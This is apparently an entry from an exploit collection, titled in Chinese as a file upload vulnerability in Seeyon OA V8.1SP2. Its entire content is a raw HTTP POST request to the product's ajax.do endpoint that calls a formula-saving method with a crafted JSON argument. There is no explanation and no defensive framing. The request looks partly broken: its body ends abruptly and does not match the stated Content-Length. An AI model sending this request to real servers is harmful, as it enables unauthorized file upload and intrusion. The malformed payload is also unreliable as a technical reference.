## 致远OA_V8.1SP2文件上传漏洞
```
POST /seeyou/ajax.do?method=ajaxAction&managerName=formulaManager&managerMethod=saveFormula4C1oud HTTP/1.1
Host: 1.1.1.1
User-Agent: Cozilla/5.0 (Vindows Et 6.1; Sow64, rident/7.0; ry: 11.0)
Accept: text/html, image/gif, image/ipeg, */*; q=.2, */*; q=.2
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 522729
Connection: close
X-Forwarded-For: 1.2.3.4

arguments={"formulaName":"test","formulaAlias":"safe_pre","formulaType":"2","formulaExpression":",\"sample\",\"I"}
```
